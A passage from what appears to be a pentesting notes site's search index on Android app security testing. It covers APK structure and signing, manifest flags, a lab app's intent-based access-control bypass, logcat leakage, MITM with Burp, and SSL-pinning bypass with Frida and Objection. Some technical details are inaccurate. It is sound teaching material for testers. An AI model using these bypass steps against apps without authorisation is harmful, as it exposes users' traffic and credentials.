Intents etc.","text":"<ul> <li>Activities: Activities is the visual screen which is interact with the User, it may contain button, TextView or many visual components.</li> <li>Services: Android component which running in background like downloading file over HTTP, Playing Music as so on. These not visible but play an important role for an android.</li> <li>Broadcast Receiver: It's listen broadcasted incoming message, the notification and receiving OTP and proceed is the suitable example of the BR.</li> <li>Intents: These are the components which re-used to bind two or more different Android components together.</li> <li>Content Provider: Content Provider handle the data related operations in android system. </li> </ul>"},{"location":"Pentesting/Android/mobile-infrastructure-and-architecture/#application-apk-structure","title":"Application APK Structure","text":"<ul> <li>Classes.dex: It's compressed Dalvik Executable file (.dex) contain Java source code file.</li> <li>AndroidManifest.xml: It's most important file in android that contain all the defined permission for the app.</li> <li>META-INF (dir): Contain Certificate and Identifiable Information.</li> <li>resources.arsc: Contains simple values, like integers, Booleans and strings, as well as references to more complex resources, like UI layouts which are stored in separate binary XML files.</li> <li>res (dir): Contain Non-complied resources like images audio.</li> <li>assets: ability to put external images, html files, JavaScript files.</li> <li>lib: contain Library file contain Java Library for support to Android apk.</li> </ul>"},{"location":"Pentesting/Android/mobile-infrastructure-and-architecture/#application-signing-and-google-bouncer","title":"Application Signing and Google Bouncer","text":"<p>If we decompile the application and recompile it again, we should be Signing with valid certificate else application will not be running.</p> <p>Android app are self-Signed, Private Key of the certificate stays with the developer and Public Key will leave on internet.</p> <p>There are two mode of Signing android App:</p> <ol> <li>Debug Mode: Whenever the app using for debugging purposes when writing the code in Eclipse or Android Studio IDE and want run the application to the Emulator so application must be signed with Debug Mode.</li> <li>Release Mode: Before application published in to playstore or publicly we need to sign the application with Self Certificate.</li> </ol>"},{"location":"Pentesting/Android/mobile-infrastructure-and-architecture/#signing-apps-for-android","title":"Signing Apps for Android:","text":"<p>Signing application in Release Mode done in few methods:</p> <ol> <li>Create a Keystore to store your Private Key</li> <li>Create a Private key using keytool <pre><code>#keytool -genkey -v -keystore [nameofkeystore] -alias [your_keyalias] -keyalg RSA -keysize 2048 -validity [numberofdays]\n</code></pre></li> <li>Sign the application using the Private Key by Jarsigner <pre><code>#jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore {name of keystore} {apk file that have to sign} {your key alia}\n</code></pre></li> <li>Verify that the app is signed <pre><code>jarsigner -verify -verbose {apk file name}\n</code></pre></li> <li>Align the APK package using zipalign <pre><code>zipalign -v 4 your_project_name.apk\n</code></pre></li> </ol>"},{"location":"Pentesting/Android/mobile-infrastructure-and-architecture/#verify-app-signature-and-extracting-signature-authority","title":"Verify app signature and Extracting Signature Authority","text":"<p>It's using when application is suspected like vulnerable or build with malware so simply there's few files that are identified</p> <pre><code>MANIFEST.MF - Declares the resources\nCERT.RSA - Public Key Certificate\nCERT.SF - App Signature Information\n</code></pre> <p>To check the information simply unzip the apk file and use keytool:</p> <pre><code>#keytool -printcert -file META-INF/CERT.RSA\n</code></pre> <p>Signature of the file:</p> <pre><code>#cat META-INF/CERT.SF\n</code></pre>"},{"location":"Pentesting/Android/poor-authorization-and-authenticationntitled/","title":"Poor Authorization and Authenticationntitled","text":""},{"location":"Pentesting/Android/poor-authorization-and-authenticationntitled/#poor-authorization-and-authenticationntitled","title":"Poor Authorization and Authenticationntitled","text":"<p>It occurs when the user is not allowed for the particular activity an attacker force to application to do such a thing which not authorized for user.</p> <p>Case-1: DIVA Access Control 1</p> <p>In this case application allows user to view the credential by clicking button so Attacking Scenario is that attacker can call the particular intent from adb so it's show's without clicking the button that mean there's no authorization required application trigger without authentication by using adb shell am (activity manager command). This method can use for bypass authentication to directly access home screen.</p> <p>De\ufb01nes an intent \ufb01lter with the name</p> <p>jakhar.aseem.diva.action.VIEW_CREDS</p> <p>adb shell am start -a jakhar.aseem.diva.action.VIEW_CREDS</p> <p>Mobile may be require to perform local authentication or authorization checks within the application. It recommendation and best practice says all the process must done in server side then load on to the mobile. If the application uses hardcoded password in hash form attacker can reverse engineer the application and take advantage of weak cryptography.</p>"},{"location":"Pentesting/Android/poor-authorization-and-authenticationntitled/#hardcoding-issue","title":"Hardcoding Issue","text":"<p>When the application stores credential in source code file as string, it\u2019s known as hardcoded vulnerability.</p> <p>How to test :</p> <ol> <li>Reverse Engineer the application</li> <li>Check the file (ls -la) see .java file and analyze password or credential string</li> </ol>"},{"location":"Pentesting/Android/reverse-engineer/","title":"Reverse Engineering and Auditing","text":""},{"location":"Pentesting/Android/reverse-engineer/#reverse-engineering-and-auditing","title":"Reverse Engineering and Auditing","text":""},{"location":"Pentesting/Android/reverse-engineer/#reverse-engineer","title":"Reverse Engineer","text":"<p>It can decode resources to nearly original form and rebuild them after making some modifications. It also makes working with an app easier because of the project like file structure and automation of some repetitive tasks like building apk, etc.</p>"},{"location":"Pentesting/Android/reverse-engineer/#decompiling-apk","title":"Decompiling Apk","text":""},{"location":"Pentesting/Android/reverse-engineer/#tools","title":"Tools:","text":"<ul> <li> <p>jadx - Dex to Java decompiler</p> </li> <li> <p>Apktool - Decode &amp; Rebuild Apk</p> </li> <li> <p>dex2jar - Tools to work with android .dex and java .class files</p> </li> <li> <p>JD-GUI - Displays Java sources from CLASS files</p> </li> </ul>"},{"location":"Pentesting/Android/reverse-engineer/#static-code-analysis","title":"Static Code Analysis","text":"<p>The analysis or inspecting source code of an android app to check suspicious behavior known as Static Code Analysis. In other words, Static Code Analysis is the process of examining application code on hard drive without running programming.</p>"},{"location":"Pentesting/Android/reverse-engineer/#dynamic-code-analysis","title":"Dynamic Code Analysis","text":"<p>Dynamic Code Analysis approach exact opposite from SCA in this type of analysis reviewing all vulnerability while application is running.</p> <p>This can be perform by many different methods I'm using there by TCPdump and Wireshark.</p> <p>DCA by TCPdump following steps:</p> <ol> <li>Download the tcpdump from: https://www.androidtcpdump.com/android-tcpdump/downloads</li> <li>Send the binary file of tcpdump to the device</li> <li>Before executive tcpdump give it rwx permission by chmod 777 tcpdump</li> <li>Now executive tcpdump by ./tcpdump -v -s 0 -w {file}.pcap</li> <li>Once process have done stop capturing packet and open it with Wireshark</li> </ol> <p>DCA by DroidBox: DroidBox is an automated tool for Dynamic Code Analysis by default it come in Android Tamor but if you integrate with your current linux system so can downloadable from https://github.com/pjlantz/droidbox. Droid</p> <ul> <li> <p>Download necessary files and uncompress it anywhere </p><pre><code>wget https://github.com/pjlantz/droidbox/releases/download/v4.1.1/DroidBox411RC.tar.gz\n</code></pre> </li> <li> <p>Setup a new AVD targeting Android 4.1.2 and choose Nexus 4 as device as well as ARM as CPU type by running: android</p> </li> <li> <p>Start the emulator with the new AVD: </p><pre><code>./startemu.sh \\&lt;AVD name&gt;\n</code></pre> </li> <li> <p>When emulator has booted up, start analyzing samples (please use the absolute path to the apk) </p><pre><code>./droidbox.sh \\&lt;file.apk&gt;\\&lt;duration in secs (optional)&gt;\n</code></pre> </li> </ul>"},{"location":"Pentesting/Android/reverse-engineer/#references","title":"References","text":"<ul> <li>https://medium.com/mindorks/static-code-analysis-for-android-using-findbugs-pmd-and-checkstyle-3a2861834c6a</li> <li>https://yasoob.me/posts/reverse-engineering-android-apps-apktool/</li> <li>https://github.com/Pixplicity/humpty-dumpty-android</li> </ul>"},{"location":"Pentesting/Android/rooting-and-connecting-devices/","title":"Rooting and Connecting Devices","text":""},{"location":"Pentesting/Android/rooting-and-connecting-devices/#rooting-and-connecting-devices","title":"Rooting and Connecting Devices","text":""},{"location":"Pentesting/Android/rooting-and-connecting-devices/#root-detection-bypass","title":"Root detection bypass","text":"<p>The most common and well-known techniques being used for root detection in the applications are as follows</p> <p>Installed Packages: Check for the any of the below-installed packages on the mobile device at runtime</p> <ul> <li>supersu.apk</li> <li>Busybox</li> <li>Root Cloak</li> <li>Xpose framework</li> <li>Cydia</li> <li>Substrate</li> </ul> <p>Installed Files: Check for the installed files and directories on the device and its permissions</p> <ul> <li>Superuser</li> <li>Supersu</li> <li>/su</li> <li>/system/app/Superuser.apk</li> <li>/system/bin</li> <li>/system/bin/su</li> <li>/system/sd/xbin</li> <li>/system/xbin/su</li> <li>/system/xbin</li> <li>/data/local</li> <li>/data/local/bin</li> <li>/data/local/xbin</li> <li>/sbin</li> <li>/system/bin/failsafe</li> <li>/vendor/bin</li> </ul>"},{"location":"Pentesting/Android/rooting-and-connecting-devices/#connect-device-via-ssh","title":"Connect device via SSH","text":"<p>Steps to Connect:</p> <ul> <li>Download and install SSH Server apk in mobile device by https://play.google.com/store/apps/details?id=net.xnano.android.sshserver</li> <li>Connect back to mobile device by using: sudo ssh {username}@{ip-address} -p {port} or Putty if in windows environment.</li> </ul>"},{"location":"Pentesting/Android/rooting-and-connecting-devices/#connect-via-vnc","title":"Connect via VNC","text":"<p>Virtual Network Computing (VNC) is a graphical desktop sharing system that uses the Remote Frame Buffer protocol (RFB) to remotely control another computer. Steps to Connect:</p> <ul> <li>Download and install SSH Server apk in mobile device by https://apkpure.com/droid-vnc-server/org.onaips.vnc</li> <li>Enter device ip and port number in address bar by following format: http://{device-ip}:{port}</li> </ul>"},{"location":"Pentesting/Android/rooting-and-connecting-devices/#connecting-device-by-usb","title":"Connecting Device by USB","text":"<p>Enable developer mode and connect usb to PC, make sure your system should have proper driver then open ADB shell.</p>"},{"location":"Pentesting/Android/ssl-pinning/","title":"SSL Pinning","text":""},{"location":"Pentesting/Android/ssl-pinning/#ssl-pinning","title":"SSL Pinning","text":""},{"location":"Pentesting/Android/ssl-pinning/#concept","title":"Concept","text":"<p>Pinning is an optional mechanism that can be used to improve the security of service or site that relies on SSL Certificates. Pinning allows you to specify a cryptographic identity that should be accepted by users visiting your site. SSL/TLS uses digital certificates to provide authentication and encryption. To trust that a certificate is genuine and valid, it is digitally signed by a root certificate belonging to a trusted certificate authority (CA).</p>"},{"location":"Pentesting/Android/ssl-pinning/#ways-to-implement-ssl-pinning","title":"Ways to Implement SSL Pinning","text":"<ol> <li> <p>Certificate Pinning: In certificate pinning , the developer hardcodes some bytecode of SSL certificate into application code. When the application communicates with the server, it checks whether the same bytecode is present in a certificate or not. If it is present, the application sends a request to the server. If the bytecode does not match it will throw an SSL certificate error. This technique prevents an attacker to use his/her own self-signed certificate.</p> </li> <li> <p>Public Key Pinning: In public key pinning when a customer visits a website, the server pins (by way of injecting it) its public key in client (customer\u2019s) browser. When the client revisits the same website, the server identifies its public key to check the integrity of the connection. This technique also prevents an attacker from using his/her self-signed certificate.</p> </li> </ol>"},{"location":"Pentesting/Android/ssl-pinning/#methods-of-certificate-pinning","title":"Methods of certificate pinning","text":""},{"location":"Pentesting/Android/ssl-pinning/#trustmanager","title":"TrustManager","text":"<p>Managers are responsible for managing the trust material used when trust decisions are made, and for deciding whether credentials presented by peers should be trusted.</p> <p>Creating TrustManagers is either done by using a TrustManagerFactory or by implementing one of the TrustManager subclasses.</p>"},{"location":"Pentesting/Android/ssl-pinning/#steps-to-bypass-ssl-pinning","title":"Steps to bypass SSL Pinning","text":""},{"location":"Pentesting/Android/ssl-pinning/#frida-for-ssl-pinning-bypass","title":"Frida for SSL pinning bypass","text":"<pre><code>$ pip install frida-tools\n</code></pre> <p>Requirements:</p> <ul> <li> <p>Python 3</p> </li> <li> <p>Linux/Windows/Mac</p> </li> <li> <p>Rooted android device</p> </li> </ul> <p>Connect your device to adb command shell, once connected you can push the downloaded file to your data/local/imp folder.</p> <pre><code>$ adb root # required\n\n$ adb push (path of the Frida file) \u00a0/data/local/tmp(path to be saved)\n</code></pre> <p>Now open Cmd/ Terminal &amp; follow these steps,</p> <pre><code>$ adb shell \"chmod 755 /data/local/tmp/frida-server\"\n\n$ adb shell \"/data/local/tmp/frida-server &amp;\"\n</code></pre> <p>If everything goes well we can make a quick check by running(this will show the processes running on device)</p> <pre><code>$ frida-ps -U\n</code></pre> <p></p> <p>Here you need to have the burpsuit certificate, for that open burpsuit &amp; go to proxy settings and click on the export certificate button, and then select \u201cCertificate in DER format\u201d and download it. \u00a0</p> <p>Once its done rename it\u2019s extension from \u201c.der\u201d to \u201c.cer\u201d. After that, you should push this file to your android device</p> <pre><code>$ adb push (path of certificate) \u00a0/data/local/tmp\n</code></pre> <p>The last part of Frida is your JavaScript, you can write your own or copy it from here. Save it as a js file &amp; run the command.</p> <pre><code>$ frida -U -f it.app.mobile -l frida-android-repinning.js --no-pause\n\nWhere\n\n-U stands for \"USB device\"\n\n-f stands for \"Filename\"\n\n-l stands for \"location of js file\"\n\n--no-pause stands for \"automatically start main thread after startup\"\n</code></pre> <p>If everything goes well, you will get an output such as</p> <p></p> <p>&amp; bypass the SSL pinning.</p> <p>Now, you are good to go, you can successfully intercept the requests and work on dynamic analysis. Some errors in this will be sometimes you won\u2019t be able to bypass in 1<sup>st</sup> attempt make it 4-5 times. While attempting once again you might get an error as \u00a0</p> <p>\u201cFrida server service already running\u201c \u00a0</p> <p>Here you need to kill that service using the adb kill command.</p> <pre><code>\u00a0$ adb shell ps | Findstr Frida\n\n\u00a0$ adb kill ps(process id)\n</code></pre> <p>This was all about Frida SSL bypass \u00a0</p> <p>Now let\u2019s move towards Objection</p>"},{"location":"Pentesting/Android/ssl-pinning/#bypass-using-objection","title":"Bypass using Objection","text":"<p>Objection is a runtime mobile exploration toolkit, powered by Frida. It was built with the aim of helping assess mobile applications and their security posture without the need for a jailbroken or rooted mobile device. \u00a0</p> <p>You can install it by running</p> <pre><code>pip3 install objection\n</code></pre> <p>Once done get your file name of the application by using Frida or adb.</p> <pre><code>$ Frida-ps -U\n\n\u00a0 \u00a0 \u00a0or\n\n$ adb shell ps\n</code></pre> <p>then,</p> <pre><code>objection patchapk -s com.xyz.android.apk\n</code></pre> <p>This will create a new apk which is hooked \u00a0</p> <p>Push the apk file or install the application by</p> <pre><code>$ adb push &lt;local file path&gt; &lt;remote file path&gt;\n\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 or\n\n$ adb install (path to apk)\n</code></pre> <p>Now run,</p> <pre><code>objection -g (new apk file name) explore -q\n\nWhere,\n\n-g stands for \"Name of the Frida Gadget/Process to connect to\"\n\n\u00a0explore \u00a0stands for \"objection exploration REPL\"\n</code></pre> <p>thus if the file is successfully injected</p> <pre><code>run \"android sslpinning disable\"\n</code></pre> <p></p> <p>Now, you are good to go and intercept the requests through burpsuit.</p>"},{"location":"Pentesting/Android/ssl-pinning/#bypass-using-xposed-framework","title":"Bypass using Xposed framework","text":"<p>Xposed is a framework that allows users to easily apply add-ons (called Modules) to the ROM. Rather than flashing a new ROM to get a specific feature, you can use Xposed to add individual features to whatever ROM you\u2019re using, or even just the stock ROM.</p> <p>Installation, \u00a0</p> <p>Download the app from here </p> <p>Run it and find an application named SSL pinning bypass, install it \u00a0</p> <p></p> <p>Thus click on whichever application you want to apply the SSL bypass &amp; you are ready to go and intercept through burp request.</p>"},{"location":"Pentesting/Android/ssl-pinning/#bypass-through-manually-changing-the-code","title":"Bypass through manually changing the code","text":"<p>The reason why I gave a link to SSL pinning implementation above is for this one, if none of the above methods works, this should work but it\u2019s not simple, here you need to have knowledge about the android app structure how it\u2019s built and how it works, sometimes a developer would choose to provide their own SSL libraries instead of relying on the system libraries to handle the SSL certificate validation. So here we can decompile the apk using apktool or simply extract it. Convert the dex file to jar using the dex2jar and open that file using Java reversing tool (such as JD-GUI). \u00a0</p> <p>Here you need to find the code responsible for certificate validation, once you get it you can manually fix it or by using Frida you can hook the application.</p> <p>Here is an awesome blog which shows a detailed way of bypassing SSL pinning using this method.</p> <p>Thus, these were some methods to bypass SSL pinning in android.</p>"},{"location":"Pentesting/Android/ssl-pinning/#tools","title":"Tools","text":"<ul> <li> <p>https://frida.re/</p> </li> <li> <p>https://github.com/sensepost/objection</p> </li> <li> <p>https://github.com/ac-pm/SSLUnpinning_Xposed</p> </li> <li> <p>https://app.box.com/s/ngrv5sietdmt2l4fwpe9o9c8avdzsf17</p> </li> </ul>"},{"location":"Pentesting/Android/ssl-pinning/#references","title":"References","text":"<ul> <li> <p>https://ninadmathpati.com/all-about-ssl-pinning-bypass/</p> </li> <li> <p>https://medium.com/@ved_wayal/hail-frida-the-universal-ssl-pinning-bypass-for-android-e9e1d733d29</p> </li> <li> <p>https://medium.com/@appmattus/android-security-ssl-pinning-1db8acb6621e</p> </li> </ul>"},{"location":"Pentesting/Android/understand-android-os/","title":"Understand Android OS","text":""},{"location":"Pentesting/Android/understand-android-os/#understand-android-os","title":"Understand Android OS","text":"<p>Android is a mobile operating system based on a modified version of the Linux kernel and other open source software, designed primarily for touchscreen mobile devices such as smartphones and tablets. Android is developed by a consortium of developers known as the Open Handset Alliance and commercially sponsored by Google.</p> <p>More than 3 Billion Devices are working on android system and as we know more the use of technology more attack surface for hackers. </p>"},{"location":"Pentesting/Android/understand-android-os/#android-architecture","title":"Android Architecture","text":"<p>Android operating system runs on top of Linux. There are a number of components required to run any operating system. In the following architecture diagram, we can see that the Android operating system consists of a number of components that are divided into five sections and four main layers. Linux Kernel is one of the components that provide basic operating system functions to smartphones. Dalvik Virtual Machine (DVM) provides an application platform for Android.</p> <p></p>"},{"location":"Pentesting/Android/understand-android-os/#application","title":"Application","text":"<p>It is the top-most layer of the Android architecture. This layer consists of native Android apps as well as apps installed by third parties. The Android package contains all the applications to be installed such as contacts, games, settings, and messages, which are all written in this layer. messages. These applications run within the Android runtime, using the classes and services provided by the application framework.</p>"},{"location":"Pentesting/Android/understand-android-os/#application-framework","title":"Application Framework","text":"<p>In addition to the Android OS, the Android framework exposes the underlying libraries and features of the device through a Java API. Application Framework includes several classes used to create the Android application. Also, it provides a generic abstraction to Hardware resources and helps in managing the user interface with application resources. Application Framework provides different types of services like Activity Manager, window manager, content provider, location manager and some others.</p>"},{"location":"Pentesting/Android/understand-android-os/#libraries","title":"Libraries","text":"<p>This component contains libraries that are used to provide some additional features or functions to the application. Let's take the example of SQLite library,this library is responsible for performing database operations such as storing, retrieving or updating data on android applications.</p>"},{"location":"Pentesting/Android/understand-android-os/#android-runtime","title":"Android Runtime","text":"<p>Android Runtime is responsible for running the android application. Android Runtime consists of two different components called core libraries and Dalvik Virtual Machine ( DVM ). The Android application relies on the core libraries to power its framework and uses the core libraries to power the android application. Running Android applications is actually done by the Dalvik Virtual Machine ( DVM ).</p>"},{"location":"Pentesting/Android/understand-android-os/#linux-kernel","title":"Linux Kernel","text":"<p>Linux kernel is the core of the android architecture. The Linux kernel is responsible for allocating Hardware resources to the android application. It also contains the drivers required by android applications so the management of drivers is also done by the Linux Kernel. </p>"},{"location":"Pentesting/Android/understand-android-os/#app-compilation-process","title":"App Compilation Process","text":"<p>Java source code is compiled by Java Compiler which uses the JIT- 'Just-In-Time' compilation model. After compilation with JIT, source code convert into bytecode with .class files. .class files again sent for compilation in the sense of minimizing code. The bytecode gets executed by target-specific-JVM (Java Virtual Machine) which is a runtime environment for Java.</p> <p>In android we use two virtual machines as Dalvik &amp; ART</p> <p>ART was introduced with release of Android 4.4 (Kitkat) but before that android was use Dalvik which is runtime environment.</p> <p>There are several reasons of ART is better than Dalvik. Dalvik is use JIT compilation model which compiler app everytime when user open it so process became slower. where as ART is use ahead of time compilation mode which compiles the apps to machine code upon installation. so the process became faster and app starts faster ART also manage better garbage collection so memory management process also improved. The installation process is slow with ART as apps to machine code conversion takes time. Compiling the code upon installation means that the app has to \u2018live' on your device. So, for a relatively smaller Java code the machine or the bytecode will be comparatively large.</p> <p></p> <p>Firstly we have resources of app which may include images, external files etc. with the help of aapt(android assets packaging tool) convert them into R.java(Refers to Resource.java). on other hand we have AIDL(Android Interface Definition Language) files which include IPC Communication Information that converts into JAVA interfaces. At last we have source code of app. R.java + Source_Code + Java_Interface compiled with java compiler and convert them into .class files</p> <p>Optionally developer can use tools like ProGuard Tool to minimize the code which become unclear and hard to understand this technique also called obfuscation. Regardless of the use of ProGuard you once again end up with .class files (minimized bytecode). other than this .class bytecode and 3<sup>rd</sup> party libraries directly convert to dex (Dalvik Executable) bytecode which also minimize the code.</p> <p>The device's runtime read these dex files and recompile some of the files to machine code for the fastest possible execution. On DALVIK this step happens as the app runs using Just-In-Time. On the newer ART, the recompilation (or translation to machine code) happens when the app is first installed, meaning that the app can run faster when the user runs it on device.</p> <p>At last we have dex files which Contain source, Compiled resources and non compiled resources by using apk builder we can convert them into apk.</p>"},{"location":"Pentesting/Android/understanding-androidmanifest.xml/","title":"Understanding AndroidManifest.xml","text":""},{"location":"Pentesting/Android/understanding-androidmanifest.xml/#understanding-androidmanifestxml","title":"Understanding AndroidManifest.xml","text":"<p>After Decompiling apk we can get AndroidManifest.xml files.  These basically contain all information related to application Configuration such as which components are used, which permissions are there etc.</p> <p>Let's start from package details, <code>package=\"com.example.app\"</code></p> <p>we might think what to do with package name but later on while doing testing it will much helpful. package name is basically different from app name which is used by system to analyze operations. while we looking into the app we found that <code>/data/data/com.example.app</code> this is the directory where most of the data stored by the app. Next is API Information, </p><pre><code>&lt;uses-sdk android:minSdkVersion=\"19\"\n\nandroid:targetSdkVersion=\"21\"\n\nandroid:maxSdkVersion=\"22\"/&gt;\n</code></pre> <p>there is bit confusion in Sdk Version and Android version both are different for example sdk version of android 4.4 (kitkat) is 19.  so what does API information exactly tell us <code>minSdkVersion</code> is specifies that below than Sdk 19 it will not support and <code>maxSdkVersion</code> is above 22 it will not gonna support and <code>targetSdkVersion</code> is the app is build for and compatible for that particular version.</p> <p>After that there are flags in file which are the most important part in security perspective </p> <pre><code>&lt;application... android: allow Backup:\"true\"&gt;&lt;/app&gt;\n</code></pre> <p>As shown above first flag is Backup which is true and the app is allow to take backup it may automatic or manually. The security risk here is that attacker can backup the app with sensitive information like credit card, user, password etc. and also restore it on his app and that become threat to user integrity.</p> <pre><code>&lt;application... android: allow debuggable:\"true\"&gt;&lt;/app&gt;\n</code></pre> <p>Second one is the debuggable mode is true which it should not be. Now if it is true attacker can able to execute some runtime code injection, gather plenty information because of staging environment. That's why it is important to set false and avoid security risk.</p> <pre><code>&lt;uses-permission android:name\"android.permission.CAMERA\"/&gt;\n</code></pre> <p>Whatever the permissions app is using is mandatory to mentioned in AndroidManifest.xml file as like in above code it is requesting permission for camera which is not own by app.  <code>WRITE_EXTERNAL_STORAGE and READ_EXTERNAL_STORAGE</code>Writing and Reading something from External Storage indicate that there is something app is interacting with external storage so accordingly we can look into external storage that it might store some sensitive data and that data is word readable and writable so anyone can access that data and modify also. </p> <p>Want to know more above permission ? Checkout Android Security Model </p> <pre><code>&lt;activity android:exported=\"true\" android:name:\".activities.example\"/&gt;\n</code></pre> <p>While declaring activity in file you can see the as mentioned above. Now dot operator helps to minimize code like <code>com.example.app/com.example.app.activities.example</code> is same as <code>com.example.app/.activities.example</code>  While going through decompiled code you can simply look for folder com &gt; example &gt; app &gt; activities &gt; example.class </p> <p>Want to know more about Activities ? Checkout Deep Dive into Activities</p> <p>Same like above other components of android are declared in file. </p> <ul> <li><code>&lt;service&gt;</code> for each subclass of Service.</li> <li><code>&lt;receiver&gt;</code> for each subclass of BroadcastReceiver.</li> <li><code>&lt;provider&gt;</code> for each subclass of Content Provider</li> </ul> <p>One more thing to notice here <code>exported=\"true\"</code> what does it means ? it means that whenever app needs to access any external app or any activity need to interfere of any other app that time time is basically allow but now as it is accessible by other apps too any malicious app can do some malicious activities with app but there is condition that the permission should miss like if the developer configure permissions then it is possible to start only if the app has required permissions. </p><pre><code>&lt;intent-filter&gt;\n\n&lt;action android:name=\"android.action.intent.MAIN\" /&gt;\n\n&lt;category android:name:\"android.intent.category.LAUNCHER\"/&gt;\n\n&lt;intent-filter&gt;\n</code></pre> <p>Want to know more about Intent &amp; Intent Filters ? Checkout Intent &amp; Intent Filters</p> <p>To start any component such as activity, service or delivering broadcast we must need intent when there is explicit intent everything know what to do next but when don't know which app is choose to do specific action cause there are lots of choices to do like share feature you have multiple options so at that time there is implicit intent implemented and when implicit intent use intent filters are there as mentioned in above code.</p> <p>Activity that is declared under an intent filter is by default exported.</p>"},{"location":"Pentesting/Android/unintended-data-leakage/","title":"Unintended Data Leakage","text":""},{"location":"Pentesting/Android/unintended-data-leakage/#unintended-data-leakage","title":"Unintended Data Leakage","text":"<p>When the developer places sensitive information or data in a location which can easily accessible for another application on the devices. During that processing, a side-effect (that is unknown to the developer) results in that information being placed into an insecure location on the mobile device that other apps on the device may have open access to. Typically, these side-effects originate from the underlying mobile device's operating system (OS). This will be a very prevalent vulnerability for code produced by a developer that does not have intimate knowledge of how that information can be stored or processed by the underlying OS.</p>"},{"location":"Pentesting/Android/unintended-data-leakage/#common-locations","title":"Common locations","text":"<ul> <li> <p>URL Caching (Both request and response)</p> </li> <li> <p>Keyboard Press Caching</p> </li> <li> <p>Copy/Paste buffer Caching</p> </li> <li> <p>Application backgrounding</p> </li> <li> <p>Insecure Logging</p> </li> <li> <p>HTML5 data storage</p> </li> <li> <p>Browser cookie objects</p> </li> <li> <p>Analytics data sent to 3<sup>rd</sup> parties</p> </li> </ul>"},{"location":"Pentesting/Android/unintended-data-leakage/#unintended-data-leakage-through-clipboard","title":"Unintended Data Leakage through Clipboard","text":"<ol> <li> <p>Install any clipboard capture application here I'm using Clipboard Manager</p> </li> <li> <p>Copy any credential or data</p> </li> </ol>"},{"location":"Pentesting/Android/unintended-data-leakage/#application-backgrounding","title":"Application backgrounding","text":"<p>Whenever user sent the app in recent or minimize it app should hide the information. for example if any bank application not allow to take a screenshot of the sensitive info but whenever the app is in recent it won't hide the info as well as the information comes in screenshot this might became a threat to user data.</p>"},{"location":"Pentesting/Android/unintended-data-leakage/#insecure-logs-and-using-of-logcat","title":"Insecure Logs and using of logcat","text":"<p>While the developing of application developer use log for testing purpose whether application is working properly or not, at the time of publish developer forget to remove these function so that vulnerability occurs. If the application consists log.i log.r, log.d or log.e that mean it's creating log that can be visible within the logcat.</p> <p>When the application is running it\u2019s logging in centralized logcat file which maintain by android, it\u2019s logging all the application log so if the application is logging sensitive information like credential so it\u2019s vulnerable for Insecure Logging</p>"},{"location":"Pentesting/Android/unintended-data-leakage/#how-to-test","title":"How to test","text":"<ol> <li> <p>Open Vulnerable app</p> </li> <li> <p>Find the process ID by using: \u00a0</p> </li> </ol> <p>1.\u00a0Adb shell ps | grep -i {vulnapp} ex. Diva \u00a0</p> <p>2.\u00a0Adb shell logcat | grep -i [pid]</p>"},{"location":"Pentesting/Android/unintended-data-leakage/#impact","title":"Impact","text":"<p>When an application processes sensitive information taken as input from the user or any other source, it may result in placing that data in an insecure location in the device. This insecure location could be accessible to other malicious apps running on the same device, thus leaving the device in a serious risk state.</p>"},{"location":"Pentesting/Android/unsafe-data-transmission/","title":"Unsafe Data Transmission","text":""},{"location":"Pentesting/Android/unsafe-data-transmission/#unsafe-data-transmission","title":"Unsafe Data Transmission","text":"<p>When a mobile application is designed, the data is exchanged in a client-server fashion. When this data is exchanged it can traverse both a carrier network and the internet. For sensitive data, if the application is coded poorly, threat agents can use techniques to view this sensitive data while it is in the mode of travel. Obviously, you would not want sensitive information like passwords, credit card numbers, or other sensitive data traveling without some sort of encryption, generally.</p> <p>There are many attack patterns some are:</p>"},{"location":"Pentesting/Android/unsafe-data-transmission/#mitm-with-burp-suite-intercepting-http-and-ssl-traffic","title":"MITM with Burp Suite - Intercepting HTTP and SSL Traffic","text":"<ol> <li> <p>Configure a mobile proxy to the Host IP address and PORT 8082, suitable and set Burp Suite listener to PORT 8082.</p> </li> <li> <p>All the traffic intercept within the burp suit.</p> </li> </ol>"},{"location":"Pentesting/Android/unsafe-data-transmission/#mitm-with-burp-suite-intercepting-http-and-ssl-traffic_1","title":"MITM with Burp Suite - Intercepting HTTP and SSL Traffic","text":"<ol> <li> <p>Configure a mobile proxy to the host IP address and PORT 8082, and set the Burp Suite listener to PORT 8082.</p> </li> <li> <p>All the traffic intercept within the burp suit.</p> </li> </ol>"},{"location":"Pentesting/Android/unsafe-data-transmission/#mitm-with-tcpdump","title":"MITM with TCPDump","text":"<ol> <li> <p>Before executive tcpdump give it rwx permission by chmod 777 tcpdump</p> </li> <li> <p>Now executive tcpdump by ./tcpdump -v -s 0 -w {file}.pcap</p> </li> <li> <p>Once process is done stop capturing packet and open it with Wireshark</p> </li> </ol>"},{"location":"Pentesting/Cloud/Best%20practice%20rules%20for%20Google%20Cloud%20Platform/","title":"Best practice rules for Google Cloud Platform","text":""},{"location":"Pentesting/Cloud/Best%20practice%20rules%20for%20Google%20Cloud%20Platform/#best-practice-rules-for-google-cloud-platform","title":"Best practice rules for Google Cloud Platform","text":"<p>Before understanding google cloud let's know what cloud computing is?</p> <p>Cloud computing is a virtualization-based technology that allows us to create, configure, and customize applications via an internet connection. The cloud technology includes a development platform, hard disk, software application, and database.</p>"},{"location":"Pentesting/Cloud/Best%20practice%20rules%20for%20Google%20Cloud%20Platform/#what-is-google-cloud","title":"What is Google Cloud?","text":"<p>Google Cloud is a cloud computing platform that provides a range of services and tools to help businesses and organizations build, deploy, and manage their applications and data in the cloud.</p>"},{"location":"Pentesting/Cloud/Best%20practice%20rules%20for%20Google%20Cloud%20Platform/#gcloud-cli","title":"GCloud CLI","text":"<p>GCloud CLI (Command Line Interface) is a tool provided by Google Cloud Platform that allows users to manage their cloud resources through a command-line interface.</p> <p>We can install gcloud cli via this link</p> <p>After installing the gcloud cli we will run the following command into the gcloud cli</p> <pre><code>gcloud auth login\n</code></pre> <p>The browser will pop up an authorization window just login it via your google account.</p>"},{"location":"Pentesting/Cloud/Best%20practice%20rules%20for%20Google%20Cloud%20Platform/#what-means-by-the-project-in-google-cloud","title":"What means by the project in Google Cloud?","text":"<p>A project organizes all your Google Cloud resources.</p> <p>The  following command is used to show the list of projects in google cloud account.</p> <pre><code>gcloud projects list \n</code></pre> <p>We can also create projects via gcloud CLI you can refer to it via gcloud 